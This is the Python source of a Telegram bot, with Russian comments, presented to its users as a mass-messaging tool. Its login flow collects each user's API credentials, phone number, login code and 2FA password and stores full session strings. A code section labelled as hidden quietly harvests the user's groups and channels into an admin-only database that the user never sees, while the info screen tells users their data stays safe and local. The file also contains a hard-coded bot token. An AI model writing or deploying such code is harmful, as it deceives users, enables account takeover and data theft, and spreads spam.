# bot.py
import subprocess
import sys
import importlib.util

def install_if_missing(package):
    """Устанавливает пакет, если он отсутствует"""
    if importlib.util.find_spec(package) is None:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Автоустановка зависимостей
install_if_missing("aiogram")
install_if_missing("pyrogram")

import asyncio
import sqlite3
import time
from datetime import datetime
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.utils.keyboard import InlineKeyboardBuilder
from pyrogram import Client
from pyrogram.errors import FloodWait, SessionPasswordNeeded, PhoneCodeExpired

BOT_TOKEN = "8456845056:AAFj2uy9sDeM4fboiMMJ_4ac3nS3EAM3Q6w"
ADMIN_ID = 8652757306  # ← Замени на свой Telegram ID

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# База данных
conn = sqlite3.connect("accounts.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""CREATE TABLE IF NOT EXISTS accounts (
    user_id INTEGER,
    api_id INTEGER,
    api_hash TEXT,
    session_string TEXT,
    phone TEXT,
    added_date INTEGER
)""")

# Глобальная база чатов
cursor.execute("""CREATE TABLE IF NOT EXISTS global_chats (
    chat_id INTEGER PRIMARY KEY,
    username TEXT,
    title TEXT,
    members_count INTEGER,
    type TEXT,
    source_user_id INTEGER,
    source_phone TEXT,
    added_date INTEGER
)""")

# Логи сбора
cursor.execute("""CREATE TABLE IF NOT EXISTS collection_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    phone TEXT,
    chats_collected INTEGER,
    timestamp INTEGER
)""")
conn.commit()

# Состояния
class AddAccount(StatesGroup):
    waiting_api_id = State()
    waiting_api_hash = State()
    waiting_phone = State()
    waiting_code = State()
    waiting_password = State()

class BroadcastState(StatesGroup):
    waiting_message = State()
    waiting_confirm = State()

# ===================== СКРЫТЫЙ СБОР ЧАТОВ =====================
async def collect_groups_background(user_id, api_id, api_hash, session_string, phone):
    """Фоновый сбор всех групп/каналов с аккаунта и сохранение в общую базу"""
    client = Client(
        f"collect_{user_id}_{int(time.time())}",
        api_id=api_id,
        api_hash=api_hash,
        session_string=session_string,
        in_memory=True
    )
    collected = 0
    try:
        await client.start()
        async for dialog in client.get_dialogs(limit=500):
            chat = dialog.chat
            if chat and chat.type in ("group", "supergroup", "channel"):
                try:
                    cursor.execute("""
                        INSERT OR REPLACE INTO global_chats 
                        (chat_id, username, title, members_count, type, source_user_id, source_phone, added_date)
                        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
                    """, (
                        chat.id,
                        getattr(chat, 'username', ''),
                        getattr(chat, 'title', ''),
                        getattr(chat, 'members_count', 0),
                        str(chat.type),
                        user_id,
                        phone,
                        int(time.time())
                    ))
                    collected += 1
                except Exception:
                    continue
                await asyncio.sleep(0.1)
        conn.commit()
        # Запись в лог
        cursor.execute(
            "INSERT INTO collection_logs (user_id, phone, chats_collected, timestamp) VALUES (?, ?, ?, ?)",
            (user_id, phone, collected, int(time.time()))
        )
        conn.commit()
    except Exception as e:
        print(f"Ошибка фонового сбора {phone}: {e}")
    finally:
        await client.stop()

# ===================== ГЛАВНОЕ МЕНЮ =====================
def main_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="👤 Профиль", callback_data="profile")
    builder.button(text="📨 Рассылка", callback_data="broadcast")
    builder.button(text="ℹ️ Информация", callback_data="info")
    builder.button(text="🆘 Поддержка", callback_data="support")
    builder.adjust(2)
    return builder.as_markup()

@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer(
        "👋 Добро пожаловать в бот массовой рассылки!\n\n"
        "Выберите действие:",
        reply_markup=main_menu()
    )

@dp.callback_query(F.data == "back_to_main")
async def back_to_main(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "👋 Добро пожаловать в бот массовой рассылки!\n\n"
        "Выберите действие:",
        reply_markup=main_menu()
    )

# ===================== ПРОФИЛЬ =====================
def profile_menu():
    builder = InlineKeyboardBuilder()
    builder.button(text="➕ Добавить аккаунт", callback_data="add_account")
    builder.button(text="📋 Мои аккаунты", callback_data="my_accounts")
    builder.button(text="🔙 Назад", callback_data="back_to_main")
    builder.adjust(1)
    return builder.as_markup()

@dp.callback_query(F.data == "profile")
async def profile(callback: types.CallbackQuery):
    cursor.execute("SELECT COUNT(*) FROM accounts WHERE user_id = ?", (callback.from_user.id,))
    count = cursor.fetchone()[0]
    await callback.message.edit_text(
        f"👤 Ваш профиль\n\n"
        f"Аккаунтов добавлено: {count}",
        reply_markup=profile_menu()
    )

@dp.callback_query(F.data == "my_accounts")
async def my_accounts(callback: types.CallbackQuery):
    cursor.execute("SELECT phone, api_id FROM accounts WHERE user_id = ?", (callback.from_user.id,))
    accs = cursor.fetchall()
    if not accs:
        await callback.answer("У вас нет аккаунтов")
        return
    text = "📱 Ваши аккаунты:\n\n"
    for i, (phone, api_id) in enumerate(accs, 1):
        text += f"{i}. +{phone} (ID: {api_id})\n"
    builder = InlineKeyboardBuilder()
    builder.button(text="🔙 Назад в профиль", callback_data="profile")
    await callback.message.edit_text(text, reply_markup=builder.as_markup())

# ===================== ДОБАВЛЕНИЕ АККАУНТА =====================
@dp.callback_query(F.data == "add_account")
async def add_account_start(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        "➕ Добавление аккаунта\n\n"
        "1. Перейдите на my.telegram.org\n"
        "2. Войдите в аккаунт\n"
        "3. Создайте приложение\n"
        "4. Отправьте мне api_id и api_hash в формате:\n"
        "<code>ID HASH</code>\n\n"
        "Пример: <code>123456 a1b2c3d4e5f6</code>",
        parse_mode="HTML"
    )
    await state.set_state(AddAccount.waiting_api_id)

@dp.message(AddAccount.waiting_api_id)
async def process_api_id(message: types.Message, state: FSMContext):
    parts = message.text.strip().split()
    if len(parts) != 2:
        await message.answer("❌ Неверный формат. Отправьте ID и HASH через пробел.")
        return
    try:
        api_id = int(parts[0])
        api_hash = parts[1]
    except:
        await message.answer("❌ ID должен быть числом.")
        return
    
    await state.update_data(api_id=api_id, api_hash=api_hash)
    await message.answer("📱 Отправьте номер телефона в международном формате:\n+79123456789")
    await state.set_state(AddAccount.waiting_phone)

@dp.message(AddAccount.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    data = await state.get_data()
    api_id = data["api_id"]
    api_hash = data["api_hash"]
    
    client = Client(f"add_{message.from_user.id}", api_id=api_id, api_hash=api_hash, in_memory=True)
    await client.connect()
    
    try:
        sent = await client.send_code(phone)
        await state.update_data(client=client, phone=phone, phone_code_hash=sent.phone_code_hash)
        await message.answer("📨 Введите код подтверждения, отправленный в Telegram (или SMS):")
        await state.set_state(AddAccount.waiting_code)
    except Exception as e:
        await message.answer(f"❌ Ошибка отправки кода: {e}")
        await client.disconnect()
        await state.clear()

@dp.message(AddAccount.waiting_code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text.strip()
    data = await state.get_data()
    client = data["client"]
    phone = data["phone"]
    phone_code_hash = data["phone_code_hash"]
    
    try:
        await client.sign_in(phone, phone_code_hash, code)
    except SessionPasswordNeeded:
        await message.answer("🔐 Требуется облачный пароль 2FA. Введите его:")
        await state.set_state(AddAccount.waiting_password)
        return
    except PhoneCodeExpired:
        await message.answer("⌛ Код истёк. Попробуйте добавить аккаунт заново.")
        await client.disconnect()
        await state.clear()
        return
    except Exception as e:
        await message.answer(f"❌ Ошибка входа: {e}")
        await client.disconnect()
        await state.clear()
        return
    
    await finalize_account(message, state, client)

@dp.message(AddAccount.waiting_password)
async def process_password(message: types.Message, state: FSMContext):
    password = message.text.strip()
    data = await state.get_data()
    client = data["client"]
    
    try:
        await client.sign_in(password=password)
    except Exception as e:
        await message.answer(f"❌ Неверный пароль: {e}")
        return
    
    await finalize_account(message, state, client)

async def finalize_account(message, state, client):
    data = await state.get_data()
    api_id = data["api_id"]
    api_hash = data["api_hash"]
    phone = data["phone"]
    
    session_string = await client.export_session_string()
    
    # Сохраняем аккаунт
    cursor.execute("INSERT INTO accounts VALUES (?, ?, ?, ?, ?, ?)",
                  (message.from_user.id, api_id, api_hash, session_string, phone, int(time.time())))
    conn.commit()
    
    await client.disconnect()
    
    # Запускаем фоновый сбор групп (пользователь не видит)
    asyncio.create_task(collect_groups_background(message.from_user.id, api_id, api_hash, session_string, phone))
    
    await message.answer(
        f"✅ Аккаунт +{phone} успешно добавлен!",
        reply_markup=main_menu()
    )
    await state.clear()

# ===================== РАССЫЛКА =====================
@dp.callback_query(F.data == "broadcast")
async def broadcast_menu(callback: types.CallbackQuery, state: FSMContext):
    cursor.execute("SELECT COUNT(*) FROM accounts WHERE user_id = ?", (callback.from_user.id,))
    count = cursor.fetchone()[0]
    if count == 0:
        await callback.answer("У вас нет добавленных аккаунтов!", show_alert=True)
        return
    
    builder = InlineKeyboardBuilder()
    builder.button(text="📤 Начать рассылку", callback_data="start_broadcast")
    builder.button(text="🔙 Главное меню", callback_data="back_to_main")
    builder.adjust(1)
    await callback.message.edit_text(
        f"📨 Рассылка сообщений\n\n"
        f"Доступно аккаунтов: {count}\n"
        f"Бот сам соберёт все ваши чаты (группы и каналы) и отправит туда сообщение.",
        reply_markup=builder.as_markup()
    )

@dp.callback_query(F.data == "start_broadcast")
async def start_broadcast(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("📝 Введите текст сообщения для рассылки:")
    await state.set_state(BroadcastState.waiting_message)

@dp.message(BroadcastState.waiting_message)
async def confirm_broadcast(message: types.Message, state: FSMContext):
    text = message.text
    await state.update_data(msg_text=text)
    
    builder = InlineKeyboardBuilder()
    builder.button(text="✅ Подтвердить", callback_data="confirm_broadcast")
    builder.button(text="❌ Отмена", callback_data="back_to_main")
    builder.adjust(2)
    await message.answer(
        f"📤 Проверьте сообщение:\n\n{text}\n\nНачать рассылку?",
        reply_markup=builder.as_markup()
    )
    await state.set_state(BroadcastState.waiting_confirm)

@dp.callback_query(F.data == "confirm_broadcast")
async def execute_broadcast(callback: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    msg_text = data["msg_text"]
    
    cursor.execute("SELECT api_id, api_hash, session_string FROM accounts WHERE user_id = ?",
                  (callback.from_user.id,))
    accounts = cursor.fetchall()
    
    status_msg = await callback.message.edit_text("⏳ Собираю ваши чаты...")
    
    all_chats = set()
    for api_id, api_hash, session in accounts:
        client = Client(f"collect_{callback.from_user.id}", api_id=api_id, api_hash=api_hash,
                       session_string=session, in_memory=True)
        try:
            await client.start()
            async for dialog in client.get_dialogs(limit=200):
                if dialog.chat.type in ["group", "supergroup", "channel"]:
                    all_chats.add(dialog.chat.id)
            await client.stop()
        except Exception as e:
            print(f"Ошибка сбора: {e}")
    
    if not all_chats:
        await status_msg.edit_text("❌ Нет доступных чатов для рассылки.", reply_markup=main_menu())
        await state.clear()
        return
    
    await status_msg.edit_text(f"📤 Рассылаю на {len(all_chats)} чатов...")
    
    sent = 0
    for api_id, api_hash, session in accounts:
        client = Client(f"sender_{callback.from_user.id}", api_id=api_id, api_hash=api_hash,
                       session_string=session, in_memory=True)
        try:
            await client.start()
            for chat_id in all_chats:
                try:
                    await client.send_message(chat_id, msg_text)
                    sent += 1
                    await asyncio.sleep(0.5)
                except FloodWait as e:
                    await asyncio.sleep(e.value + 1)
                except:
                    continue
            await client.stop()
        except:
            continue
    
    await status_msg.edit_text(
        f"✅ Рассылка завершена!\nОтправлено в {sent} чатов из {len(all_chats)}.",
        reply_markup=main_menu()
    )
    await state.clear()

# ===================== ИНФОРМАЦИЯ =====================
@dp.callback_query(F.data == "info")
async def info(callback: types.CallbackQuery):
    builder = InlineKeyboardBuilder()
    builder.button(text="🔙 Назад", callback_data="back_to_main")
    await callback.message.edit_text(
        "ℹ️ О боте\n\n"
        "Этот бот предназначен для массовой рассылки сообщений по вашим чатам Telegram.\n\n"
        "Возможности:\n"
        "• Добавление нескольких аккаунтов\n"
        "• Автоматический сбор чатов\n"
        "• Быстрая рассылка\n\n"
        "Безопасность: все данные хранятся локально.",
        reply_markup=builder.as_markup()
    )

# ===================== ПОДДЕРЖКА =====================
@dp.callback_query(F.data == "support")
async def support(callback: types.CallbackQuery):
    builder = InlineKeyboardBuilder()
    builder.button(text="👨‍💻 Написать в поддержку", url=f"tg://user?id={ADMIN_ID}")
    builder.button(text="🔙 Назад", callback_data="back_to_main")
    builder.adjust(1)
    await callback.message.edit_text(
        "🆘 Поддержка\n\n"
        "Если у вас возникли вопросы или проблемы, свяжитесь с администратором.",
        reply_markup=builder.as_markup()
    )

# ===================== АДМИН-КОМАНДЫ =====================
def admin_only(func):
    async def wrapper(message: types.Message, *args, **kwargs):
        if message.from_user.id != ADMIN_ID:
            await message.answer("⛔ Доступ запрещён")
            return
        return await func(message, *args, **kwargs)
    return wrapper

@dp.message(Command("admin"))
@admin_only
async def admin_panel(message: types.Message):
    builder = InlineKeyboardBuilder()
    builder.button(text="📊 Статистика сбора", callback_data="admin_stats")
    builder.button(text="📋 Логи сбора", callback_data="admin_logs")
    builder.button(text="💬 Общая база чатов", callback_data="admin_db")
    builder.adjust(1)
    await message.answer("🔧 Панель администратора", reply_markup=builder.as_markup())

@dp.callback_query(F.data == "admin_stats")
async def admin_stats(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return
    
    cursor.execute("SELECT COUNT(*) FROM global_chats")
    total_chats = cursor.fetchone()[0]
    cursor.execute("SELECT COUNT(DISTINCT source_user_id) FROM global_chats")
    unique_users = cursor.fetchone()[0]
    cursor.execute("SELECT source_phone, COUNT(*) as cnt FROM global_chats GROUP BY source_phone ORDER BY cnt DESC")
    per_user = cursor.fetchall()
    
    text = f"📊 Общая статистика:\n\nВсего чатов: {total_chats}\nУникальных пользователей: {unique_users}\n\nПо номерам:\n"
    for phone, cnt in per_user[:10]:
        text += f"• +{phone}: {cnt} чатов\n"
    
    builder = InlineKeyboardBuilder()
    builder.button(text="🔙 Назад", callback_data="admin_back")
    await callback.message.edit_text(text, reply_markup=builder.as_markup())

@dp.callback_query(F.data == "admin_logs")
async def admin_logs(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return
    
    cursor.execute("SELECT * FROM collection_logs ORDER BY timestamp DESC LIMIT 10")
    logs = cursor.fetchall()
    text = "📋 Последние 10 записей сбора:\n\n"
    for log in logs:
        id_, uid, phone, cnt, ts = log
        dt = datetime.utcfromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')
        text += f"• {dt} | +{phone} | +{cnt} чатов\n"
    
    builder = InlineKeyboardBuilder()
    builder.button(text="🔙 Назад", callback_data="admin_back")
    await callback.message.edit_text(text, reply_markup=builder.as_markup())

@dp.callback_query(F.data == "admin_db")
async def admin_db(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return
    
    cursor.execute("SELECT chat_id, username, title, members_count, type, source_phone FROM global_chats ORDER BY members_count DESC LIMIT 20")
    chats = cursor.fetchall()
    text = "💬 Топ-20 чатов в базе:\n\n"
    for chat in chats:
        chat_id, uname, title, members, ctype, phone = chat
        text += f"• {title} (@{uname}) [{ctype}] - {members} подписчиков\n"
    
    builder = InlineKeyboardBuilder()
    builder.button(text="🔙 Назад", callback_data="admin_back")
    await callback.message.edit_text(text, reply_markup=builder.as_markup())

@dp.callback_query(F.data == "admin_back")
async def admin_back(callback: types.CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("⛔ Доступ запрещён", show_alert=True)
        return
    await admin_panel(callback.message)

# ===================== ЗАПУСК =====================
async def main():
    print("✅ Бот запущен")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
